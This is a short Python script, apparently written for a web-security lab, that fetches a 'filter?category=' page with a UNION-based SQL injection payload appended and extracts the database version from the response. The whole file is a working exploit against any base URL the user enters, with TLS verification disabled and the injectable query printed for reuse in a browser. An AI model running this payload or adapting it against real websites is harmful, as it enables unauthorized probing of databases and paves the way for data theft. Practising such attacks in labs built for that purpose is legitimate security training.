import re 
import requests
import urllib3
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s=requests.Session()
def sql_exploit(s,url):
    path="filter?category=Gifts" # change accordily 
    
    payload="'union select version(),null%23"
    
    r=s.get(url+path+payload,verify=False)
    res=r.text
    soup = bs(res,'html.parser')
    version = soup.find(string=re.compile(r".*\d{1,2}\.\d{1,2}\.\d{1,2}.*"))

    if version == None:
        return False
    
    else:
        print(f"[+] found database version is : {version}")
        print(f" You can also get this out on browser using below qeury ")
        print(f"query : {url+path+payload}")
        return True
    
if __name__ ==  "__main__":
    try:
        url=input("Please enter base url ")
        
        if not url:
            raise ValueError("Please enter valid url :")
        
        print("[+] Dumping database verison ")
        database_version = sql_exploit(s,url)
        
        if not database_version:
            print("[-] Unable to find database")
        
        
    except ValueError as e :
        print(e)
    